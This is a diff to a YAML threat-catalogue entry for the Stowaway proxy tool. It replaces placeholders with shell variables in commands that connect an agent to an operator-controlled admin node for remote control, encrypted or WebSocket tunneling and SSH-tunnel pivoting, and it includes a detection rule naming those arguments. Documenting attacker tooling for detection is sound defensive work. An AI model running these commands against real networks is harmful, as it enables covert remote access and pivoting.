@@ -11,14 +11,14 @@ Commands:
       Privileges: User
       OperatingSystem: Windows, Linux, MacOS
 
-    - Command: "./stowaway_agent -c <ADMIN_IP>:9999"
+    - Command: "./stowaway_agent -c $ADMIN_IP:9999"
       Description: Connects an agent to the operator-controlled admin node at the supplied address, enabling remote control and tunneling through the agent.
       Usecase: Establishing an outbound Stowaway session from a host behind NAT or a firewall.
       Category: Access
       Privileges: User
       OperatingSystem: Windows, Linux, MacOS
 
-    - Command: "./stowaway_agent -c <ADMIN_IP>:9999 -s 123"
+    - Command: "./stowaway_agent -c $ADMIN_IP:9999 -s 123"
       Description: Connects an agent to the admin node with the shared key 123, enabling encrypted Stowaway communication.
       Usecase: Establishing an encrypted session between an agent and the operator-controlled admin node.
       Category: Access
@@ -32,7 +32,7 @@ Commands:
       Privileges: User
       OperatingSystem: Windows, Linux, MacOS
 
-    - Command: "./stowaway_agent -c <ADMIN_IP>:9999 --up ws"
+    - Command: "./stowaway_agent -c $ADMIN_IP:9999 --up ws"
       Description: Uses WebSocket for the agent-to-parent transport, allowing Stowaway traffic to traverse HTTP/WebSocket-aware infrastructure.
       Usecase: Establishing a Stowaway session with a WebSocket upstream transport.
       Category: Access
@@ -60,7 +60,7 @@ Commands:
       Privileges: User
       OperatingSystem: Windows, Linux, MacOS
 
-    - Command: "sshtunnel <IP:SSH_PORT> <AGENT_PORT>"
+    - Command: "sshtunnel $SSH_ENDPOINT $AGENT_PORT"
       Description: Connects a new agent through an SSH tunnel to the Stowaway network using the specified SSH endpoint and agent port.
       Usecase: Adding a downstream agent to a multi-hop Stowaway topology through an SSH tunnel.
       Category: Access
@@ -72,7 +72,7 @@ Full_Path:
     - Filename: stowaway_admin
     - Filename: stowaway_agent
 Detection:
-    - Command: Execution of stowaway_admin or stowaway_agent, including SOCKS/forward/reconnect arguments such as socks 7777, forward 9000 127.0.0.1:22, backward 9001 22, sshtunnel <IP:SSH_PORT> <AGENT_PORT>, and --reconnect 10.
+    - Command: Execution of stowaway_admin or stowaway_agent, including SOCKS/forward/reconnect arguments such as socks 7777, forward 9000 127.0.0.1:22, backward 9001 22, sshtunnel $SSH_ENDPOINT $AGENT_PORT, and --reconnect 10.
 Resources:
     - Link: https://github.com/ph4ntonn/Stowaway
     - Link: https://securityonline.info/goserpent-backdoor
